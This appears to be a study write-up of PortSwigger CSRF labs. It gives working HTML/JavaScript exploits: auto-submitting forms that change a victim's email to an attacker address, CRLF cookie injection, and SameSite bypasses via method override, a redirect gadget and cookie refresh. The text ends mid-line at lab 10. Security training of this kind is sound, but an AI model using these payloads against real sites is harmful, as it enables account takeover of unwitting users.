# Cross-Site Request Forgery (CSRF) Labs PortSwigger

### Practitioner
**Completed:** 9/11

---

### CSRF Token Validation Issues
### 2. CSRF where token validation depends on request method

**Goal:** Bypass CSRF protection.

**Vulnerability:** Token validation only occurs for POST requests.

**Technique:** Convert the request to GET, which bypasses token validation.

**Exploit:**

<form action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
document.forms[0].submit();
</script>

---

### 3. CSRF where token validation depends on token being present

**Goal:** Bypass CSRF protection.

**Vulnerability:** The server only validates the token if it exists.

**Technique:** Remove the csrf parameter entirely.

**Exploit:**

<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
document.forms[0].submit();
</script>

---

### 4. CSRF where token is not tied to user session

**Goal:** Perform CSRF using a valid token from another user.

**Vulnerability:** CSRF tokens are not bound to the user session.

**Technique:**

- Obtain a token from one account
- Use it in another account's request

**Result:** The server accepts the request even though the token belongs to a different session.

---

### 5. CSRF where token is tied to non-session cookie

**Goal:** Bypass CSRF using cookie injection.

**Vulnerability:** The csrfKey cookie is not tied to the session.

**Technique:**

- Inject a cookie using CRLF injection
- Use the attacker-controlled CSRF token

**Exploit:**

<img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie: csrfKey=ATTACKERKEY; SameSite=None"
onerror="document.forms[0].submit()">

---

### 6. CSRF where token is duplicated in cookie

**Goal:** Exploit the double-submit cookie pattern.

**Vulnerability:** The CSRF token is validated by comparing it with a cookie value.

**Technique:**

- Inject a fake CSRF cookie
- Send the same value in the request body

**Exploit:**

<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="fake">
</form>

<img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie: csrf=fake; SameSite=None"
onerror="document.forms[0].submit()">
SameSite Cookie Bypass

---

### 7. SameSite Lax bypass via method override

**Goal:** Perform CSRF despite SameSite=Lax cookies.

**Technique:**

- Convert POST request to GET
- Override method using _method=POST

**Exploit:**

<script>
document.location="https://LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@evil.com&_method=POST";
</script>

---

### 8. SameSite Strict bypass via client-side redirect

**Goal:** Bypass SameSite=Strict cookie restrictions.

**Technique:**

- Trigger a same-site redirect gadget
- Redirect to the vulnerable endpoint

**Exploit:**

<script>
document.location="https://LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned@evil.com%26submit=1";
</script>

---

### 9. SameSite Lax bypass via cookie refresh

**Goal:** Refresh the victim’s session cookie before launching the attack.

**Technique:**

- Force OAuth login flow
- Refresh session cookie
- Send CSRF request

**Exploit:**

<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@evil.com">
</form>

<p>Click anywhere</p>

<script>
window.onclick = () => {
    window.open('https://LAB-ID.web-security-academy.net/social-login');
    setTimeout(() => document.forms[0].submit(), 5000);
}
</script>
Header Validation Bypass

---

### 10. CSRF where Referer validation depends on header being present

**Goal:** Bypass Referer validation.

**Vulnerability:** The request is accepted if the Referer header is missing.

**Technique:** Suppress the Referer header using HTML ??EXPLOIT
